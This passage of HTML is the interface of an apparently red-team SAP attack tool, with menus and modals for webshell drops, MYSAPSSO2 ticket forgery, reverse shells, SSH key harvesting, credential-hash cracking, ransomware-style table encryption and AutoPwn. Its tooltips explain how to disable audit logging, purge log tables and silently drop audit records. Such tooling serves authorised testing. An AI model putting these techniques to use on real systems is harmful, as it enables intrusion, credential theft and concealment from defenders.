      <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
      <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
      <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
      <div class="ctx-item" data-action="exploit_cve_31324_drop">&#128272; Drop JSP Webshell (CVE-2025-31324)</div>
      <div class="ctx-item" data-action="wd_admin_probe_defaults">&#128270; Probe WD admin default credentials</div>
      <div class="ctx-item" data-action="icmad_acl_bypass">&#9889; ICMAD ACL Bypass Sweep (CVE-2022-22536)</div>
      <div class="ctx-item" data-action="icmad_heapdump_pull">&#128190; ICMAD &#8594; Pull Heap Dump (HPROF)</div>
      <div class="ctx-item" data-action="create_user_gw">&#128100; Create User (GW Exploit)</div>
      <div class="ctx-item" data-action="create_user_dpmon_sapstar">&#9889; Create User (dpmon SAP*, kernel &ge; 790)</div>
      <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
      <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
      <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
      <div class="ctx-item" data-action="file_browser">&#128193; File Browser (upload / download)</div>
      <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
      <div class="ctx-item" data-action="import_transport">&#128230; Import Local Transport (zip)</div>
      <div class="ctx-item" data-action="tms_propagate" style="color:#f0883e">&#127919; Propagate Transport across TMS Domain</div>
      <div class="ctx-sep"></div>
      <!-- MYSAPSSO2 ticket-forgery workflow.  The SSO2 profile
           pre-flight check used to be its own menu entry; it now
           runs implicitly as step 2.5 of Forge (via RFC
           PFL_GET_SINGLE_PARAMETER when credentials are
           available, falling back to profile-file read via
           sapxpg).  Operators wanting an isolated check can use
           ``python3 tools/check_sso2_profile.py`` from the CLI. -->
      <div class="ctx-item" data-action="forge_ticket">&#127915; Forge MYSAPSSO2 Ticket (impersonate any user)</div>
      <div class="ctx-item" data-action="propagate_ticket">&#128640; Propagate Forged Ticket (HTTP+RFC across trust)</div>
      <div class="ctx-item" data-action="discover_strustsso2">&#128279; Discover STRUSTSSO2 Trust (who trusts whom)</div>
      <div class="ctx-item" data-action="forge_and_fanout">&#128293; Forge &amp; Fanout (auto-replay across trust subgraph)</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" data-action="ssh_harvest">&#128273; SSH Key Harvest (exfiltrate keys + known_hosts)</div>
      <div class="ctx-item" data-action="ssh_harvest_root">&#128273; SSH Key Harvest as Root (all users via LPE)</div>
      <div class="ctx-item" data-action="ssh_test_keys">&#128640; SSH Lateral Movement (test keys against targets)</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
      <div class="ctx-item" data-action="harvest_btp_creds">&#9729; Harvest BTP Credentials (lateral to cloud)</div>
      <div class="ctx-item" data-action="verify_pp_impersonation">&#127919; Verify PP Impersonation (Live Probe)</div>
    </div>
  </div>
  <!-- Cloud Connector submenu (visible only when SCC is on same host) -->
  <div class="ctx-group write-op" id="ctx-scc-group">
    <div class="ctx-item">&#9889; Cloud Connector</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="scc_via_sap_set_credentials">&#128273; Set SCC Credentials</div>
      <div class="ctx-item" data-action="scc_via_sap_probe_creds">&#128273; Probe Default Account (Administrator/manage)</div>
      <div class="ctx-item" data-action="scc_via_sap_pull_mappings">&#128194; Pull Mappings</div>
      <div class="ctx-item" data-action="scc_via_sap_probe_mappings">&#128225; Probe Mappings (TCP/HTTP smoke test)</div>
      <div class="ctx-item" data-action="scc_via_sap_extract_keystore" style="color:#f85149">&#128272; Extract Keystore + Decrypt SSFS (CROWN JEWELS)</div>
      <div class="ctx-item" data-action="scc_via_sap_download_hashes">&#128196; Harvest SCC Password Hashes</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" data-action="harvest_scc">&#9928; Harvest SCC Files (post-RCE)</div>
      <div class="ctx-item" data-action="harvest_scc_hashes_via_lpe" style="color:#f0883e">&#128274; Harvest SCC Hashes (escalate via Linux LPE)</div>
      <div class="ctx-item" data-action="harvest_scc_mappings">&#128194; Harvest SCC Mappings (OS-exec)</div>
      <div class="ctx-item" data-action="harvest_scc_ssfs">&#128273; Decrypt On-Host SSFS (Recover Secrets)</div>
    </div>
  </div>
  <!-- Evasion submenu — Tier 1 telemetry posture probe, Tier 3
       pre-flight + discovery + active mutations.  Tier 3 items only
       become interactive when SAPMAP was launched with
       --allow-evasion (and, for the actual writers, after a
       baseline has been captured for the node).

       Submenu icon: ninja (U+1F977).  Each item carries a `title`
       attribute the browser renders as a hover tooltip so the
       operator can read a one-line summary of what the action does
       without clicking. -->
  <div class="ctx-group">
    <div class="ctx-item">&#129399; Evasion</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="probe_telemetry"
           title="Tier 1 OPSEC enrichment. Reads runtime profile parameters (rsau/enable, rsau/integrity, rsau/ip_only, rec/client, stat/level, gw/logging, rdisp/TRACE) via TH_GET_PARAMETER plus the SAL filter slots via RSAU_API_GET_AUDIT_CONFIG. Pure read; no SAL config touched, no AUM/AUW events. Tells the operator what audit/trace surfaces are on or off BEFORE any mutation decision."
           >&#128270; Probe Audit Telemetry (SAL / integrity / params)</div>
      <div class="ctx-item" data-action="capture_evasion_baseline"
           title="Tier 3 pre-flight snapshot. Calls TH_GET_PARAMETER + RSAU_API_GET_AUDIT_CONFIG + RSAU_API_GET_PROFILE(ID_DYN_CONF='X') and writes loot/baseline/<SID>/baseline_<ts>.json with the full param + slot + filter-row state. Required before any Tier 3 mutation can run — restore-on-exit replays this exact snapshot. Pure read; nothing on the target changes."
           >&#128190; Capture Evasion Baseline (Tier 3 pre-flight)</div>
      <div class="ctx-item" data-action="probe_rsau_api"
           title="Tier 3 discovery. Calls FUNCTION_EXISTS + RFC_GET_FUNCTION_INTERFACE for the RSAU_API_* family (GET_AUDIT_CONFIG, SET_PROFILE, GET_PROFILE, SET_PARAM, GET_PARAM, UPD_AUDIT_CONFIG) and dumps each existing FM's IMPORT/EXPORT/TABLES signature to loot/baseline/<SID>/rsau_api_probe_<ts>.json. Pure metadata read; no SAL config touched."
           >&#128270; Probe RSAU API Surface (Tier 3 discovery)</div>
      <div class="ctx-item" data-action="probe_rsau_dyn_profile"
           title="Tier 3 discovery. Calls RSAU_API_GET_PROFILE(ID_DYN_CONF='X') and dumps the verbatim ET_FILT / ET_FILTEX / ET_TEXT / ET_LOG rows to loot/baseline/<SID>/dyn_profile_<ts>.json. Reveals the exact 12-field RSAUPROF row shape the writer needs to construct. Pure read; no mutation."
           >&#128270; Probe RSAU Dynamic Profile (Tier 3 discovery)</div>
      <div class="ctx-item write-op" data-action="tier3_sal_slot_disable"
           title="Tier 3 MUTATION. Disables one or more SAL filter slots for a hold window, then auto-restores. Accepts a single slot ('1'), comma list ('1,2,3'), or 'ALL'. Primary path: RSAU_UPD_AUDIT_CONFIG (shared-memory only — no disk persistence, no SM19 header change). Fallback: RSAU_API_SET_PROFILE (persists to disk if legacy FMs unavailable)."
           >&#128263; Disable SAL Slot(s)... (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_gw_logging_off"
           title="Tier 3 MUTATION. Sets gw/logging=0 (Gateway logging level) via TH_CHANGE_PARAMETER (shared memory only — no profile-file rewrite). Suppresses dev_rd / dev_ms gateway action logs for the session. Auto-restores baseline value on exit. Confirmed runtime-changeable on S/4 793."
           >&#128683; Suppress Gateway Logging (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_rdisp_trace_off"
           title="Tier 3 MUTATION. Sets rdisp/TRACE=0 (dispatcher trace level) via TH_CHANGE_PARAMETER (shared memory only — no profile-file rewrite). Stops dev_disp / dev_w* dispatcher and work-process trace writes. Auto-restores baseline value on exit. Confirmed runtime-changeable on S/4 793."
           >&#128683; Suppress Dispatcher Trace (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_sal_uname_narrow"
           title="Tier 3 MUTATION. Swaps one or more SAL slots' UNAME filter to a replacement value (e.g. operator's real user) for a hold window. Slot stays STATUS='X' (looks active in SM19) but no longer matches SAPMAP00. Stealth path only (RSAU_UPD_AUDIT_CONFIG, SHM-only — no disk persistence, no SM19 header change). Baseline UNAMEs auto-restored on exit."
           >&#129399; Narrow SAL Slot UNAME... (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_java_sal_suppress"
           title="Tier 3 MUTATION (Java). Deploys a LogController JSP and sets the 6 Java Security Audit Log categories (/System/Security/Audit + 5 subcategories) to Severity.NONE via Category.setEffectiveSeverity(). Runtime-only (JVM heap — no config file change, no NWA change-log entry). Auto-restores baseline severity on exit. Requires a Java deployment path (CVE-2025-31324, CTC, telnet, or GW)."
           >&#128683; Suppress Java SAL... (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_dbtablog_purge"
           title="Tier 3 MUTATION (ABAP). Captures MAX(LOGID) baseline on DBTABLOG, waits hold_seconds, then DELETEs every row written after that point (optional TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — the DELETE does not recurse. No DD09L touch, no DDIC activation, no transport object. Requires RFC_ABAP_INSTALL_AND_RUN."
           >&#129529; Purge DBTABLOG... (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_sal_death_star_launch"
           title="Tier 3 MUTATION (Linux). Virtual SAP Death Star (Julian Petersohn / @randomstr1ng). Uploads sap_audit_hook.c to /tmp, compiles as <sid>adm, ptrace-attaches to a disp+work worker, plants INT3 breakpoints on the three SAL sinks (fwrite×2 + write_event_to_DB + EtdSendEvent). In --suppress mode audit records matching the filter are silently dropped in-memory — SM20 shows nothing, no disk write, no DB row, no ETD/SIEM. Persists as a background process until Disarm. Requires Linux + <sid>adm + kernel.yama.ptrace_scope <= 1. Not a 0-day — SAP publicly confirmed this is post-exploitation."
           >&#127770; Arm Virtual SAP Death Star... (Tier 3 mutation)</div>
      <div class="ctx-item write-op" data-action="tier3_sal_death_star_stop"
           title="Tier 3 disarm. SIGTERM the running sap_audit_hook. Its signal handler runs detach_all() which restores every INT3 byte in the target disp+work text segment and releases ptrace cleanly. Idempotent — safe to click even when nothing is running."
           >&#10071; Disarm Virtual SAP Death Star (Tier 3 disarm)</div>
    </div>
  </div>
  <!-- Data Extraction submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#128230; Data Extraction</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="download_hashes">&#128273; Extract Hashes for Cracking</div>
      <div class="ctx-item" data-action="wd_extract_icmauth">&#128272; Extract WD password hashes (icmauth.txt)</div>
      <div class="ctx-item" data-action="download_secstore">&#128273; Download SecStore (RSECTAB)</div>
      <div class="ctx-item" data-action="download_java_secstore">&#128273; Download Java Secure Store</div>
      <div class="ctx-item" data-action="view_java_secstore">&#128203; View Java Secure Store Results</div>
      <div class="ctx-item" data-action="download_table">&#128229; Download Table Data</div>
      <div class="ctx-item" data-action="read_usrextid">&#128279; Read USREXTID (PP impersonation surface)</div>
    </div>
  </div>
  <!-- Business Impact submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128200; Business Impact</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="impact_assess">&#128200; Run ABAP Impact Scenarios</div>
      <div class="ctx-item" data-action="impact_assess_java">&#128200; Run Java Impact Scenarios</div>
      <div class="ctx-item" data-action="impact_view">&#128202; View Impact Results</div>
    </div>
  </div>
  <!-- RanSAPware Awareness PoC -->
  <div class="ctx-group write-op">
    <div class="ctx-item" style="color:#f85149">&#128274; RanSAPware Awareness</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="ransapware_encrypt" style="color:#f85149">&#128274; Encrypt Table Data</div>
      <div class="ctx-item" data-action="ransapware_decrypt">&#128275; Decrypt (Restore)</div>
    </div>
  </div>
  <!-- Cleanup submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#128465; Cleanup</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="cleanup">&#128465; Delete SAPMAP00 User</div>
    </div>
  </div>
  <div class="ctx-sep"></div>
  <!-- Settings submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#9881; Settings</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="set_type">&#9881; Set System Type</div>
      <div class="ctx-item" data-action="set_sid">&#9881; Set SID</div>
      <div class="ctx-item" data-action="set_db_type">&#9881; Set DB Type</div>
      <div class="ctx-item" data-action="set_os_type">&#9881; Set OS Type</div>
      <div class="ctx-item" data-action="set_instance_nr">&#9881; Set Instance Number</div>
      <div class="ctx-item" data-action="set_saprouter">&#128268; Set SAProuter</div>
      <div class="ctx-item" data-action="set_telnet_override">&#128279; Set Telnet Endpoint (SSH tunnel)</div>
    </div>
  </div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="delete_system" style="color:#f85149">&#128465; Delete System from Map</div>
</div>

<!-- Map Background Context Menu -->
<div class="ctx-menu" id="map-ctx-menu">
  <div class="ctx-item" data-action="map_add_system">&#10133; Add System Manually</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item write-op" data-action="map_autopwn" style="color:#f85149;font-weight:bold">&#9889; AutoPwn</div>
  <div class="ctx-item write-op" data-action="map_propagate_all">&#128640; Auto-Propagate All</div>
  <div class="ctx-item write-op" data-action="map_cleanup_all">&#129529; Cleanup All Users</div>
  <div class="ctx-item" data-action="map_scan_all_vulns" style="color:#f0883e">&#128270; Scan for All Vulnerabilities</div>
  <div class="ctx-item" id="map-ctx-check-all-gw" data-action="map_check_all_gw">&#128272; Check All GW Vulnerabilities</div>
  <div class="ctx-item" id="map-ctx-check-all-betrusted" data-action="map_check_all_betrusted">&#128272; Check All 10KBlaze (MS Betrusted)</div>
  <div class="ctx-item" id="map-ctx-check-all-cve-31324" data-action="map_check_all_cve_31324">&#128272; Check All CVE-2025-31324 (Java VisualComposer)</div>
  <div class="ctx-item" id="map-ctx-check-all-cve-6287" data-action="map_check_all_cve_6287">&#128272; Check All CVE-2020-6287 (RECON)</div>
  <div class="ctx-item" id="map-ctx-check-all-cve-22536" data-action="map_check_all_cve_22536">&#128272; Check All CVE-2022-22536 (ICMAD)</div>
  <div class="ctx-item" id="map-ctx-check-all-router-info" data-action="map_check_all_router_info">&#128272; Check All SAProuter Info Leak</div>
  <div class="ctx-item" id="map-ctx-check-all-snc" data-action="map_check_all_snc">&#128274; Check All SNC Posture</div>
  <div class="ctx-item" data-action="map_attack_coverage">&#9876;&#65039; ATT&amp;CK Coverage Matrix</div>
  <div class="ctx-item" data-action="map_analyze_chains">&#128279; Analyze Trust Chains</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="map_fit">&#128208; Fit to Window</div>
  <div class="ctx-item" data-action="map_reset_layout">&#128260; Reset Layout</div>
</div>

<!-- SAP Cloud Connector Context Menu -->
<div class="ctx-menu" id="scc-ctx-menu">
  <!-- Top-level quick actions -->
  <div class="ctx-item" data-action="scc_details">&#128269; View SCC Details</div>
  <div class="ctx-item write-op" data-action="scc_set_credentials">&#128273; Set Credentials</div>
  <div class="ctx-sep"></div>
  <!-- Scanning submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#128225; Scanning</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="scc_probe_creds">&#128273; Probe Default Account (Administrator/manage)</div>
      <div class="ctx-item" data-action="scc_probe_mappings">&#128225; Probe Mappings (TCP/HTTP smoke test)</div>
      <div class="ctx-item" data-action="scc_analyse_pp">&#128269; Analyse Principal-Propagation Trust</div>
    </div>
  </div>
  <!-- Exploitation submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#9876; Exploitation</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="scc_extract_keystore" style="color:#f85149">&#128272; Extract Keystore + Decrypt SSFS (FULL BACKUP — CROWN JEWELS)</div>
    </div>
  </div>
  <!-- Data Extraction submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#128230; Data Extraction</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="scc_pull_mappings">&#128194; Pull Mappings</div>
      <div class="ctx-item" data-action="scc_download_hashes">&#128196; Download Password Hashes</div>
    </div>
  </div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="scc_delete" style="color:#f85149">&#128465; Remove from Map</div>
</div>

<!-- BTP Subaccount Context Menu -->
<div class="ctx-menu" id="btp-ctx-menu">
  <div class="ctx-item" data-action="btp_details">&#128269; View Subaccount Details</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item write-op" data-action="btp_mint_via_cert">&#128273; Mint Token via Cert-Auth (RFC 8705)</div>
  <div class="ctx-item write-op" data-action="btp_mint_via_local_cert">&#128274; Mint Token via Local Cert Files (workstation)</div>
  <div class="ctx-item" data-action="btp_pull_destinations">&#128229; Refresh Destinations</div>
  <div class="ctx-item" data-action="btp_highlight_links">&#128279; Highlight Linked On-prem Targets</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="btp_copy_uuid">&#128203; Copy Subaccount UUID</div>
  <div class="ctx-item" data-action="btp_copy_subdomain">&#128203; Copy Subdomain</div>
  <div class="ctx-item" data-action="btp_copy_region">&#128203; Copy Region</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="btp_remove" style="color:#f85149">&#128465; Remove from Map</div>
</div>

<!-- TMSADM Edge Context Menu — filled by showTMSCtxMenu -->
<div class="ctx-menu" id="tms-ctx-menu"></div>

<!-- DBCON Edge Context Menu — filled by showDBCONCtxMenu -->
<div class="ctx-menu" id="dbcon-ctx-menu"></div>

<!-- Connection Info Panel -->
<div class="info-panel" id="info-panel"></div>
<div id="toast-stack" style="position:fixed;right:16px;bottom:16px;z-index:2000;
     display:flex;flex-direction:column-reverse;gap:8px;pointer-events:none"></div>

<!-- System Detail Panel -->
<div class="detail-panel" id="detail-panel"></div>

<!-- Credentials Modal -->
<div class="modal-overlay" id="cred-modal">
  <div class="modal">
    <h3>&#128273; Provide Credentials</h3>
    <div id="cred-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Instance Number</label>
      <input type="text" id="cred-instance" placeholder="00" style="width:60px">
      <span id="cred-instance-hint" style="font-size:10px;color:#484f58;margin-left:8px"></span>
    </div>
    <div class="form-row">
      <label>Client</label>
      <input type="text" id="cred-client" placeholder="100">
    </div>
    <div class="form-row">
      <label>Username</label>
      <input type="text" id="cred-user" placeholder="">
    </div>
    <div class="form-row">
      <label>Password</label>
      <input type="password" id="cred-pass" placeholder="">
    </div>
    <div class="form-actions">
      <button class="btn" onclick="testCredentials()">Test Connection</button>
      <button class="btn btn-primary" onclick="saveCredentials()">Save &amp; Use</button>
      <button class="btn" onclick="closeModal('cred-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SCC Credentials Modal -->
<div class="modal-overlay" id="scc-cred-modal">
  <div class="modal">
    <h3>&#128273; SCC Credentials</h3>
    <div id="scc-cred-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Username</label>
      <input type="text" id="scc-cred-user" placeholder="Administrator">
    </div>
    <div class="form-row">
      <label>Password</label>
      <input type="password" id="scc-cred-pass" placeholder="">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSCCCredentials()">Save</button>
      <button class="btn" onclick="closeModal('scc-cred-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- WD admin Credentials Modal -->
<div class="modal-overlay" id="wd-cred-modal">
  <div class="modal">
    <h3>&#128273; WD admin Credentials (/sap/wdisp/admin)</h3>
    <div id="wd-cred-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:12px;line-height:1.4">
      Enter the WD admin Basic-auth credentials.  The generator-stamped username
      is typically <code>webadm</code> (see the user line at the top of the
      <code>WDP_W00_*</code> profile).  Once saved, the credentials are used to
      pull the full <code>wdisp/system_*</code> table and the WD's kernel info
      &mdash; resolving every backend SID + MSHOST + MSPORT, including backends
      that share the same Server header on the wire.
    </div>
    <div class="form-row">
      <label>Username</label>
      <input type="text" id="wd-cred-user" placeholder="webadm">
    </div>
    <div class="form-row">
      <label>Password</label>
      <input type="password" id="wd-cred-pass" placeholder="">
    </div>
    <div class="form-actions">
      <button class="btn" onclick="testWdCredentials()">Test &amp; Save</button>
      <button class="btn btn-primary" onclick="saveWdCredentialsAndExtract()">Save &amp; Pull Backend Table</button>
      <button class="btn" onclick="closeModal('wd-cred-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- WD icmauth.txt Paste Modal -->
<div class="modal-overlay" id="wd-icmauth-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#128272; WD icmauth.txt &mdash; Paste Password Hashes</h3>
    <div id="wd-icmauth-reason" style="font-size:12px;color:#f0883e;margin-bottom:10px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:12px;line-height:1.4">
      SAP locks <code>icmauth.txt</code> behind the OS filesystem on most
      installs, so the WD admin's web UI does not serve it.  Grab it manually:
      <ul style="margin:6px 0 6px 18px;padding:0">
        <li><b>Windows:</b> <code>C:\usr\sap\&lt;SAPSID&gt;\SYS\global\security\data\icmauth.txt</code></li>
        <li><b>UNIX:</b> <code>/usr/sap/&lt;SAPSID&gt;/SYS/global/security/data/icmauth.txt</code></li>
      </ul>
      Paste the full file contents below.  Each line is parsed
      <code>user:{SHA384}&lt;base64&gt;:comment</code> and converted to a
      hashcat-ready hex digest.  When a <b>hashes.com</b> API key is
      configured in Settings, the parsed hashes are auto-submitted for a
      rainbow-table lookup &mdash; cracked plaintexts get stored as
      <code>wd_admin</code> credentials on this node.
    </div>
    <textarea id="wd-icmauth-text" rows="8" style="width:100%;font-family:monospace;font-size:12px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px" placeholder="# Authentication file for ICM and SAP Web Dispatcher authentication&#10;webadm:{SHA384}JElZSxeYdaMxO+pxADLgVmt5MnTZsJoDXRfCBvhgEM1JRychHCM9iVzFO0Z1PuuM:admin"></textarea>
    <div class="form-actions" style="margin-top:12px">
      <button class="btn btn-primary" onclick="submitIcmauthPaste()">Parse &amp; Lookup on hashes.com</button>
      <button class="btn" onclick="closeModal('wd-icmauth-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SCC Password Hashes Modal -->
<div class="modal-overlay" id="scc-hashes-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#128196; SCC Password Hashes</h3>
    <div id="scc-hashes-source" style="font-size:11px;color:#8b949e;margin-bottom:10px"></div>
    <div id="scc-hashes-table" style="overflow-x:auto;margin-bottom:12px"></div>
    <div id="scc-hashes-cmds" style="margin-bottom:12px"></div>
    <div id="scc-hashes-online-results" style="margin-top:8px"></div>
    <div style="font-size:11px;color:#8b949e;margin-top:10px;display:flex;align-items:center;gap:6px">
      <input type="checkbox" id="hashes-auto-lookup-cb" onchange="setAutoLookupHashes(this.checked)" style="margin:0">
      <label for="hashes-auto-lookup-cb" style="cursor:pointer">
        Auto-lookup on hashes.com after each extract (when API key is set)
      </label>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="sccHashesCopy()">Copy Hashes</button>
      <button class="btn" id="hashes-lookup-btn" onclick="sccLookupHashesOnline()">&#128269; Lookup on hashes.com</button>
      <button class="btn" onclick="closeModal('scc-hashes-modal')">Close</button>
    </div>
  </div>
</div>

<!-- BTP Token Paste Modal -->
<div class="modal-overlay" id="btp-token-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#9729;&#65039; SAP BTP — Paste cf oauth-token</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Paste the output of <code>cf oauth-token</code> (a JWT starting
      with <code>eyJ</code>).  SAPMAP decodes the token offline to learn
      its region + identity, stores it in process memory only (NEVER
      written to disk), and exposes BTP enumeration actions
      (subaccounts, SCC mappings, destinations with cleartext capture).
      <br><br>
      <b>Operational guard-rails:</b> rate-limit 1 req/100 ms with hard
      cap of 200 req/min.  Every outbound BTP API call is logged to the
      console with the token's fingerprint.  Token wiped on process exit.
    </div>
    <div class="form-row">
      <label>cf oauth-token (JWT)</label>
      <textarea id="btp-token-input" rows="3" placeholder="eyJhbGciOiJSUzI1NiIs..."
                style="width:100%;font-family:monospace;font-size:11px"></textarea>
    </div>
    <div id="btp-token-status" style="margin-top:10px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="btpStoreToken()">Store + validate</button>
      <button class="btn" onclick="btpClearTokens()">Clear all stored tokens</button>
      <button class="btn" onclick="closeModal('btp-token-modal')">Close</button>
    </div>
  </div>
</div>

<!-- BTP Connectivity Proxy Override Modal -->
<div class="modal-overlay" id="btp-proxy-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#9729;&#65039; BTP — Connectivity Proxy Override</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      The PP-impersonation live probe drives a forward-proxy HTTP
      request through BTP's connectivity proxy:
      <code>connectivityproxy.internal.cf.&lt;region&gt;.hana.ondemand.com:20003</code>.
      That hostname is <b>not</b> publicly reachable — it only accepts
      connections from inside BTP's Cloud Foundry runtime.  Set an
      override here when you're tunnelling via <code>cf ssh</code> from
      a developer machine.  See
      <code>tools/btp_ssh_bridge/README.md</code> for the recipe.
      <br><br>
      The proxy <b>also</b> wants a Connectivity-service-bound JWT for
      its <code>Proxy-Authorization</code> header.  If the probe returns
      HTTP 407, paste a connectivity-service token below — get it by
      binding the Connectivity service to the bridge app, cf-ssh-ing
      in, and running a <code>client_credentials</code> curl call
      against the bound UAA.
      <br><br>
      <b>Scope:</b> both fields are in-memory only, wiped on restart,
      never written to disk.
    </div>
    <div class="form-row">
      <label>Proxy host:port</label>
      <input type="text" id="btp-proxy-input" placeholder="localhost:20003"
              style="width:100%;font-family:monospace;font-size:12px">
    </div>
    <div class="form-row" style="margin-top:10px">
      <label>Connectivity-service JWT
        <span style="color:#8b949e;font-size:10px">(Proxy-Authorization, optional)</span>
      </label>
      <textarea id="btp-proxy-auth-input" rows="3"
                placeholder="eyJhbGciOiJSUzI1NiIs... (only needed when probe returns HTTP 407)"
                style="width:100%;font-family:monospace;font-size:11px"></textarea>
    </div>
    <div id="btp-proxy-status" style="margin-top:10px;font-size:11px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="btpStoreProxyOverride()">Save</button>
      <button class="btn" onclick="btpClearProxyOverride()">Clear all</button>
      <button class="btn" onclick="closeModal('btp-proxy-modal')">Close</button>
    </div>
  </div>
</div>

<!-- BTP Subaccount drawer (right side) — shown via showBtpSubaccount() -->
<div class="modal-overlay" id="btp-sub-modal">
  <div class="modal" style="max-width:860px;width:95vw">
    <h3 id="btp-sub-title">&#9729;&#65039; BTP Subaccount</h3>
    <div id="btp-sub-meta" style="font-size:11px;color:#8b949e;margin-bottom:12px"></div>
    <div id="btp-sub-actions" style="margin-bottom:14px"></div>
    <div id="btp-sub-destinations"></div>
    <div class="form-actions">
      <button class="btn" onclick="closeModal('btp-sub-modal')">Close</button>
    </div>
  </div>
</div>

<!-- Diff Two Runs Modal -->
<div class="modal-overlay" id="diff-modal">
  <div class="modal" style="max-width:680px;width:95vw">
    <h3>&#128202; Diff Two Runs</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Compare two engagement snapshots — saved <code>.sapmap</code>
      files in the <code>states/</code> folder, or your live in-memory
      state.  Output: a self-contained HTML diff under
      <code>loot/reports/</code> showing what changed (new pwns, new
      findings, new attack paths to PRD, removed findings, etc.).
    </div>
    <div class="form-row">
      <label>Baseline (older run)</label>
      <select id="diff-baseline" style="width:100%"></select>
    </div>
    <div class="form-row">
      <label>Current (newer run)</label>
      <select id="diff-current" style="width:100%"></select>
    </div>
    <div id="diff-result" style="margin-top:12px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="runDiffCompute()">Compare</button>
      <button class="btn" onclick="closeModal('diff-modal')">Close</button>
    </div>
  </div>
</div>

<!-- MITRE ATT&CK Coverage Modal — draggable + resizable so the
     operator can shove it aside to inspect map nodes underneath. -->
<div class="modal-overlay overlay-transparent" id="attack-modal">
  <div class="modal modal-draggable" style="width:97vw;height:88vh;display:flex;flex-direction:column">
    <div class="modal-drag-handle" style="padding-bottom:6px">
      <h3 style="margin:0 0 6px 0;display:flex;align-items:center;gap:8px">
        <span style="color:#6e7681;font-size:11px;font-weight:normal">&#9868;&#65039;</span>
        &#9876;&#65039; MITRE ATT&amp;CK Coverage
        <span style="color:#8b949e;font-weight:normal;font-size:11px"
              id="attack-modal-subtitle"></span>
      </h3>
    </div>
    <div class="modal-body" style="padding:0 2px">
      <div style="font-size:11px;color:#8b949e;margin-bottom:10px">
        Techniques exercised across this engagement, grouped by tactic.
        Severity-coloured (INFO → CRITICAL); click a cell to flash the
        map nodes where the technique was observed.
        <div style="margin-top:8px;padding:8px 10px;background:#0d1117;border:1px solid #21262d;border-radius:4px">
          <a href="#" onclick="downloadAttackNavigatorLayer();return false"
             style="color:#79c0ff;font-weight:600">&#128190; Export Navigator layer (JSON → loot/reports/)</a>
          <div style="margin-top:6px;color:#6e7681;line-height:1.5">
            Then open
            <a href="https://mitre-attack.github.io/attack-navigator/" target="_blank" rel="noopener noreferrer"
               style="color:#79c0ff">mitre-attack.github.io/attack-navigator</a>
            &rarr; <em>Open Existing Layer</em> &rarr; <em>Upload from local</em>
            &rarr; pick the file from <code style="color:#cfd9df">loot/reports/</code>.
            You'll get MITRE's canonical interactive heatmap of this engagement.
          </div>
        </div>
      </div>
